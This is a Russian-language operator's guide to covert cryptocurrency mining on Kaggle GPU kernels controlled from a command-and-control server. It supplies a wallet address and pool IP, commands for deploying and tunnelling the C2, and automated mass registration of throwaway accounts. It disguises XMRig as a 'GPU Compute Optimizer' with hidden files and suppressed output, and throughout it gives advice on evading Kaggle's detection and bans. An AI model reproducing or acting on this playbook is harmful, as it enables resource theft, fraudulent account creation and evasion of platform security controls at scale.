# 🎯 KAGGLE STEALTH MINING - ПОЛНОЕ РУКОВОДСТВО

## ⚠️ ВАЖНО: МАЙНИНГ ТОЛЬКО НА KAGGLE!

**НЕ МАЙНИТЬ НА ЛОКАЛЬНОЙ МАШИНЕ!**
Весь майнинг осуществляется **СКРЫТНО** на Kaggle GPU kernels через "GPU Compute Optimizer".

---

## 🔒 КОНЦЕПЦИЯ БЕЗОПАСНОСТИ

### Почему Kaggle?
- ✅ **Бесплатные GPU** (P100, T4) - 30 часов/неделю на аккаунт
- ✅ **Легитимный вид** - выглядит как оптимизация GPU
- ✅ **Не ваша машина** - нет следов на локальном ПК
- ✅ **Масштабируемость** - множество аккаунтов = множество GPU
- ✅ **Анонимность** - Kaggle не видит реальный майнинг

### Маскировка:
- 🎭 **Название:** "GPU Compute Optimizer v2.1"
- 🎭 **Процесс:** `/kaggle/working/.cache/optimizer`
- 🎭 **Конфиг:** `.cache/config.json` (скрытая папка)
- 🎭 **Вывод:** `stdout/stderr → /dev/null`
- 🎭 **User-Agent:** "KaggleKernel/2.1"

---

## 📊 ТЕКУЩАЯ КОНФИГУРАЦИЯ

### Wallet:
```
44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5
```

### Pool:
```
45.155.102.89:10128
```
- IP вместо домена (нет DNS запросов)
- Нестандартный порт (не привлекает внимание)
- Прямое подключение

### C2 Server:
```
http://YOUR_IP:5000
```
(Настраивается при деплое)

---

## 🚀 БЫСТРЫЙ СТАРТ

### 1. Запуск C2 сервера

```bash
cd /mnt/F/C2_server-main
./manage.sh start
```

Сервер будет доступен на:
- Local: http://localhost:5000
- LAN: http://192.168.0.172:5000

### 2. Получение публичного URL (для Kaggle)

**Вариант A: Cloudflare Tunnel (рекомендуется)**
```bash
# Установка cloudflared
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb

# Запуск туннеля
cloudflared tunnel --url http://localhost:5000
```

Получите URL вида: `https://xxx-xxx-xxx.trycloudflare.com`

**Вариант B: ngrok**
```bash
ngrok http 5000
```

**Вариант C: localtunnel**
```bash
npm install -g localtunnel
lt --port 5000
```

### 3. Настройка C2 URL в Dashboard

1. Откройте http://localhost:5000
2. Login: `admin` / `admin` (или `2409`)
3. Settings → Configuration
4. Установите **Public URL**: `https://your-tunnel-url.com`
5. Save

---

## 📦 ДЕПЛОЙ KAGGLE KERNELS

### Способ 1: Через Web Dashboard (РЕКОМЕНДУЕТСЯ)

1. **Откройте Dashboard:** http://localhost:5000
2. **Перейдите в Laboratory** (Kaggle GPU Control)
3. **Добавьте Kaggle аккаунт:**
   - Username: ваш Kaggle username
   - API Key: ваш Kaggle API key
4. **Deploy Kernels:**
   - Выберите аккаунт
   - Количество kernels: 5 (максимум)
   - Enable Mining: ✓
   - Click "Deploy"

### Способ 2: Через командную строку

```bash
cd /mnt/F/C2_server-main

# Добавить аккаунт
python3 kaggle/auto_manager.py --add username:api_key

# Деплой kernels
python3 kaggle/auto_manager.py --setup username

# Или через deploy_unified.py
python3 kaggle/deploy_unified.py \
  --c2-url https://your-tunnel-url.com \
  --count 5
```

### Способ 3: Автоматическая регистрация + деплой

```bash
# Полная автоматизация (регистрация + деплой + мониторинг)
python3 kaggle/auto_manager.py --auto 10
```

Это создаст 10 аккаунтов автоматически и задеплоит на каждом по 5 kernels.

---

## 🎛️ УПРАВЛЕНИЕ ЧЕРЕЗ C2

### Dashboard (http://localhost:5000)

**1. Devices (Устройства)**
- Список всех подключенных Kaggle agents
- Статус: online/offline
- Последняя активность
- Worker ID

**2. Laboratory (Kaggle GPU Control)**
- Список Kaggle аккаунтов
- Статус kernels (Running/Complete/Error)
- Deploy новых kernels
- Restart failed kernels
- Мониторинг hashrate

**3. Console (Командная консоль)**
- Выполнение команд на Kaggle agents
- Проверка GPU: `gpu`
- Проверка процессов: `ps aux | grep optimizer`
- Проверка майнинга: `netstat -tn | grep 10128`

---

## 📊 МОНИТОРИНГ

### 1. C2 Dashboard

**Real-time мониторинг:**
- Количество активных agents
- Hashrate по каждому kernel
- Статус подключения к пулу
- Логи в реальном времени

### 2. Pool Dashboard

**MoneroOcean:**
```
https://moneroocean.stream/#/dashboard
```

**Введите ваш wallet:**
```
44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5
```

**Вы увидите:**
- Все workers (username-1, username-2, etc.)
- Hashrate по каждому worker
- Pending balance
- Payment history

### 3. Kaggle Kernels

**Проверка через Kaggle UI:**
1. Зайдите на kaggle.com
2. Your Work → Kernels
3. Проверьте статус kernels:
   - Running ✓ (хорошо)
   - Complete ✗ (нужен рестарт)
   - Error ✗ (проверить логи)

---

## 🔧 АВТОМАТИЗАЦИЯ

### Auto-Monitor (Автоматический мониторинг)

```bash
# Запуск мониторинга (проверка каждые 5 минут)
python3 kaggle/auto_manager.py --monitor
```

**Что делает:**
- Проверяет статус всех kernels
- Автоматически перезапускает завершенные
- Логирует все действия
- Отправляет уведомления в C2

### Auto-Deploy (Автоматический деплой)

```bash
# Полная автоматизация
python3 kaggle/auto_manager.py --auto 20
```

**Что делает:**
1. Регистрирует новые Kaggle аккаунты (через tempmail)
2. Создает dataset с XMRig
3. Деплоит 5 kernels на каждый аккаунт
4. Запускает мониторинг
5. Автоматически рестартит failed kernels

---

## 💰 ПРОИЗВОДИТЕЛЬНОСТЬ И ДОХОД

### Один Kaggle Kernel:

**GPU P100:**
- Hashrate: ~1000-1500 H/s
- Доход: ~$0.15-0.25/день

**GPU T4:**
- Hashrate: ~500-800 H/s
- Доход: ~$0.08-0.12/день

### Масштабирование:

| Аккаунтов | Kernels | Hashrate | Доход/день | Доход/месяц |
|-----------|---------|----------|------------|-------------|
| 1         | 5       | 5K H/s   | $0.75      | $22.50      |
| 5         | 25      | 25K H/s  | $3.75      | $112.50     |
| 10        | 50      | 50K H/s  | $7.50      | $225.00     |
| 20        | 100     | 100K H/s | $15.00     | $450.00     |
| 50        | 250     | 250K H/s | $37.50     | $1,125.00   |

**Лимиты Kaggle:**
- 30 часов GPU/неделю на аккаунт
- ~4.3 часа/день
- Нужна ротация kernels

---

## 🛡️ БЕЗОПАСНОСТЬ И OPSEC

### ✅ Что УЖЕ сделано:

1. **Маскировка процесса:**
   - Название: "GPU Compute Optimizer"
   - Путь: `.cache/optimizer` (скрытая папка)
   - Вывод: `/dev/null`

2. **Скрытие сети:**
   - IP вместо домена
   - Нестандартный порт
   - SSL/TLS для C2

3. **Легитимный вид:**
   - User-Agent: "KaggleKernel/2.1"
   - Notebook выглядит как оптимизация
   - Нет упоминаний "mining" или "xmrig"

4. **C2 интеграция:**
   - Beacon каждые 5 секунд
   - Heartbeat каждую минуту
   - Удаленное управление

### ⚠️ Дополнительные меры:

1. **Не деплоить все kernels сразу:**
   ```bash
   # Деплой с задержкой
   for i in {1..5}; do
       python3 kaggle/deploy_unified.py --count 1
       sleep 300  # 5 минут между деплоями
   done
   ```

2. **Использовать разные аккаунты:**
   - Не более 5 kernels на аккаунт
   - Разные email провайдеры
   - Разные имена/пароли

3. **Ротация kernels:**
   - Не запускать 24/7
   - Использовать расписание
   - Останавливать на ночь

4. **Мониторить логи Kaggle:**
   - Проверять на warnings
   - Не превышать лимиты
   - Останавливать при подозрениях

---

## 🔍 ПРОВЕРКА СКРЫТНОСТИ

### Что видит Kaggle:

```python
# В notebook видно только:
print("GPU Compute Optimizer v2.1")
print("Optimizing GPU performance...")
print("Running optimization tasks...")
```

### Что НЕ видит Kaggle:

- ❌ Слово "mining" или "xmrig"
- ❌ Подключение к пулу (скрыто в .cache)
- ❌ Реальный процесс майнинга
- ❌ Вывод XMRig (перенаправлен в /dev/null)

### Проверка через C2:

```bash
# Выполнить на Kaggle agent через Console:

# 1. Проверить процесс
ps aux | grep optimizer

# 2. Проверить сеть
netstat -tn | grep 10128

# 3. Проверить файлы
ls -la /kaggle/working/.cache/

# 4. Проверить GPU
nvidia-smi
```

---

## 🚨 РЕШЕНИЕ ПРОБЛЕМ

### Kernel завершился (Complete):

**Причина:** Kaggle автоматически останавливает kernels через 9 часов.

**Решение:**
```bash
# Автоматический рестарт через monitor
python3 kaggle/auto_manager.py --monitor

# Или вручную через Dashboard:
Laboratory → Select Account → Restart Failed Kernels
```

### Agent не подключается к C2:

**Причина:** C2 URL недоступен или неправильный.

**Решение:**
1. Проверить Cloudflare tunnel: `cloudflared tunnel --url http://localhost:5000`
2. Обновить Public URL в Settings
3. Redeploy kernels с новым URL

### Низкий hashrate:

**Причина:** GPU не используется или CPU-only режим.

**Решение:**
1. Проверить GPU через Console: `gpu`
2. Проверить CUDA: `nvidia-smi`
3. Убедиться что kernel имеет GPU accelerator

### Kaggle заблокировал аккаунт:

**Причина:** Превышение лимитов или подозрительная активность.

**Решение:**
1. Использовать другой аккаунт
2. Уменьшить количество kernels
3. Добавить задержки между деплоями
4. Не запускать 24/7

---

## 📝 ЧЕКЛИСТ ЗАПУСКА

- [ ] C2 сервер запущен (`./manage.sh start`)
- [ ] Cloudflare tunnel активен
- [ ] Public URL настроен в Settings
- [ ] Kaggle аккаунты добавлены
- [ ] Kernels задеплоены (5 на аккаунт)
- [ ] Agents подключились к C2
- [ ] Майнинг запущен (проверить через Console)
- [ ] Мониторинг активен (`--monitor`)
- [ ] Pool dashboard показывает workers
- [ ] Hashrate растет

---

## 🎯 КОМАНДЫ БЫСТРОГО ДОСТУПА

```bash
# C2 Server
./manage.sh start          # Запуск C2
./manage.sh status         # Статус C2
./manage.sh logs           # Логи C2

# Kaggle Management
python3 kaggle/auto_manager.py --status    # Статус аккаунтов
python3 kaggle/auto_manager.py --monitor   # Мониторинг
python3 kaggle/auto_manager.py --auto 10   # Полная автоматизация

# Deploy
python3 kaggle/deploy_unified.py --c2-url https://xxx.trycloudflare.com --count 5

# Cloudflare Tunnel
cloudflared tunnel --url http://localhost:5000
```

---

## 💎 ИТОГОВАЯ СХЕМА

```
┌─────────────────────────────────────────────────────────┐
│                   ВАШ КОМПЬЮТЕР                         │
│  ┌───────────────────────────────────────────────────┐  │
│  │           C2 Server (Flask)                       │  │
│  │  • Dashboard: http://localhost:5000               │  │
│  │  • Public URL: https://xxx.trycloudflare.com      │  │
│  │  • Управление agents                              │  │
│  │  • Мониторинг hashrate                            │  │
│  └───────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
                         ▲
                         │ HTTPS (SSL/TLS)
                         │ Beacon every 5s
                         │
┌────────────────────────┴─────────────────────────────────┐
│                   KAGGLE CLOUD                           │
│  ┌─────────────────────────────────────────────────┐    │
│  │  Account 1: username1                           │    │
│  │  ├─ Kernel 1: gpu-optimizer-1 (P100) → 1200H/s │    │
│  │  ├─ Kernel 2: gpu-optimizer-2 (T4)   → 600H/s  │    │
│  │  ├─ Kernel 3: gpu-optimizer-3 (P100) → 1200H/s │    │
│  │  ├─ Kernel 4: gpu-optimizer-4 (T4)   → 600H/s  │    │
│  │  └─ Kernel 5: gpu-optimizer-5 (P100) → 1200H/s │    │
│  └─────────────────────────────────────────────────┘    │
│  ┌─────────────────────────────────────────────────┐    │
│  │  Account 2: username2                           │    │
│  │  └─ 5 kernels...                                │    │
│  └─────────────────────────────────────────────────┘    │
│  ... (до 50 аккаунтов)                                  │
└──────────────────────────────────────────────────────────┘
                         │
                         │ Stratum Protocol
                         │ Port 10128
                         ▼
┌─────────────────────────────────────────────────────────┐
│              MINING POOL                                │
│  • IP: 45.155.102.89:10128                             │
│  • Workers: username1-1, username1-2, ...              │
│  • Total Hashrate: 50K+ H/s                            │
│  • Wallet: 44haKQM5F43d37q3k6mV...                     │
└─────────────────────────────────────────────────────────┘
```

---

## ✅ ФИНАЛЬНЫЙ ЧЕКЛИСТ

**НИКОГДА НЕ МАЙНИТЬ НА ЛОКАЛЬНОЙ МАШИНЕ!**

✅ Весь майнинг на Kaggle GPU kernels
✅ Процесс маскируется как "GPU Compute Optimizer"
✅ Скрытые файлы в `.cache`
✅ Вывод в `/dev/null`
✅ C2 управление через HTTPS
✅ Автоматический мониторинг и рестарт
✅ Множество аккаунтов для масштабирования
✅ Pool dashboard для проверки дохода

---

**🎯 ВСЁ ГОТОВО! ЗАПУСКАЙТЕ KAGGLE MINING! 💎**

```bash
# 1. Запустить C2
./manage.sh start

# 2. Запустить Cloudflare tunnel
cloudflared tunnel --url http://localhost:5000

# 3. Открыть Dashboard
http://localhost:5000

# 4. Deploy Kaggle kernels через Laboratory
# 5. Мониторить через Dashboard и Pool
```

**МАЙНИНГ ТОЛЬКО НА KAGGLE! НЕ НА ЛОКАЛЬНОЙ МАШИНЕ!** 🚀
